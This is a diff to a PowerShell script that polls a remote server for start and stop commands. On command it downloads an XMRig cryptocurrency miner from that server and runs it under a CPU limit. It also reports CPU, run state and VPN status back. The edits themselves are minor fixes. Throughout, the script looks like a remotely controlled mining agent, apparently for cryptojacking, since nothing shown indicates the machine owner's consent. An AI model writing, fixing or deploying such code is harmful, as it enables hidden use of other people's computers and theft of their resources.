@@ -2,7 +2,7 @@ $SERVER = "https://mcontrol.vercel.app/"
 $SYSTEM = $env:COMPUTERNAME
 
 $TEMP_DIR = "$env:TEMP\worker_env"
-$WORKER = $null
+$WORKER = $false
 $CPU_LIMIT = 70
 
 $BASE_DIR = "C:\soft"
@@ -30,7 +30,7 @@ $headers = @{
         # Write-Host "Info:$info.country"
         # Write-Host "Public IP Country: $country"
         # if ($WORKER -and $WORKER.HasExited) {
-        #  Write-Host "Worker crashed. Restarting."
+        # Write-Host "Worker crashed. Restarting."
         # Start-Worker
 }
  catch {
@@ -50,9 +50,9 @@ function Send-Status($running,$cpu,$vpnStatus){
   
     $data = @{
         id = $SYSTEM
-        running = $running
+        running =[bool] $running
         cpu = [int]$cpu
-        vpn = $vpnStatus
+        vpn = [bool] $vpnStatus
     } | ConvertTo-Json
 
 Invoke-RestMethod `
@@ -67,9 +67,8 @@ function Get-Command {
     param ($SystemId  )
       Write-Host "Checking ID: $SystemId" 
       $cmd = Invoke-RestMethod ` -Uri     "https://mcontrol.vercel.app/api/command?id=$SystemId" ` -Method GET ` -ContentType "application/json" ` -ErrorAction Stop # Added to ensure catch block works 
-          Write-Host "getcmd: $($cmd | ConvertTo-Json -Compress)"
-   
- 
+      Write-Host "getcmd: $($cmd | ConvertTo-Json -Compress)"
+    
     return $cmd.command
 }
  function Mit([string]$command) {
@@ -85,10 +84,10 @@ function Get-Command {
         if (!(Test-Path $TEMP_DIR)) {
             New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null
         }
-           New-Item -ItemType Directory -Path $M | Out-Null
-            Write-Host "m folder created"
-        $zipFile = "$TEMP_DIR\m.zip"
-        $minerZipUrl = "https://mcontrol.vercel.app/xmrig-6.25.0.zip"
+        New-Item -ItemType Directory -Path $M | Out-Null
+          Write-Host "m folder created"
+          $zipFile = "$TEMP_DIR\m.zip"
+          $minerZipUrl = "https://mcontrol.vercel.app/xmrig-6.25.0.zip"
 
         Write-Host "Downloading mining package..."
 
@@ -143,7 +142,7 @@ function Swok {
     # If worker already running, do nothing
     if ($global:WORKER) { return }
     # Mark worker as running
-    $global:WORKER = $true
+     $global:WORKER = $true
     # Call mining function with start signal
     Mit "start"
     Write-Host "Started"
@@ -157,7 +156,7 @@ function Swnok {
     # Call Mit with stop command
     Mit "stop"
     # Mark worker as stopped
-    $global:WORKER = $null
+    $global:WORKER = $false
 }
 
 while($true){
@@ -172,8 +171,8 @@ while($true){
     if($cmd -eq "start"){ Swok Write-Host ¨called start $cmd¨ }
     if($cmd -eq "stop"){ Swnok Write-Host "called stop $cmd"}
 
-    $running = $WORKER -ne $null
-    Write-Host "$running runn in wprker: $WRKER"
+    $running = $WORKER 
+    Write-Host "$running run in wprker: $WORKER"
 
     $vpnStatus = Check-VPN
    
